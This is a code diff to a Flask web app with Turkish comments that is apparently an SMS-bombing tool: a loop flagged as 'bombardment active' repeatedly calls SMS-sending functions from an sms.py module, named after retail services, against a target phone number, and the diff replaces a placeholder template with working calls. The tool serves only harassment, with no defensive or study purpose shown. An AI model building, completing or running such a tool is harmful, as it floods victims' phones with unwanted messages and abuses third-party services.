@@ -1,8 +1,8 @@
-import sms
 from flask import Flask, render_template_string, request
 import threading
 import time
 import requests
+import sms  # sms.py dosyanı bağlar
 
 app = Flask(__name__)
 bombardiman_aktif = False
@@ -10,18 +10,19 @@ bombardiman_aktif = False
 def sms_gonder_dongusu(tel_no, turbo_mod):
     global bombardiman_aktif
     
-    # Telefon numarasının başındaki 0'ı atarak 10 haneli standart formata getirir
+    # Telefon numarasını 10 haneli formata getirir
     formatli_tel = tel_no[-10:]
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    
+    # sms.py içindeki SendSms sınıfını başlatır (phone ve mail parametreleriyle)
+    servis = sms.SendSms(formatli_tel, "")
 
     while bombardiman_aktif:
         try:
-            # === SMS.PY İÇİNDEKİ AKTİF API İSTEKLERİNİ BURAYA YERLEŞTİR ===
-            # Örnek Şablon:
-            # url = "https://istek-atilacak-servis.com/api"
-            # payload = {"phone": formatli_tel}
-            # requests.post(url, json=payload, headers=headers, timeout=3)
-            pass
+            # Sınıfın içindeki SMS atan fonksiyonları sırayla tetikler
+            servis.KahveDunyasi()
+            servis.Wmf()
+            # sms.py içine yeni fonksiyonlar eklersen onları da buraya alt alta ekleyebilirsin
+            
         except Exception:
             pass
             
@@ -58,7 +59,8 @@ HTML_SAYFA = """
 """
 
 @app.route('/')
-def ana_sayfa(): return render_template_string(HTML_SAYFA)
+def ana_sayfa(): 
+    return render_template_string(HTML_SAYFA)
 
 @app.route('/baslat', methods=['POST'])
 def baslat():
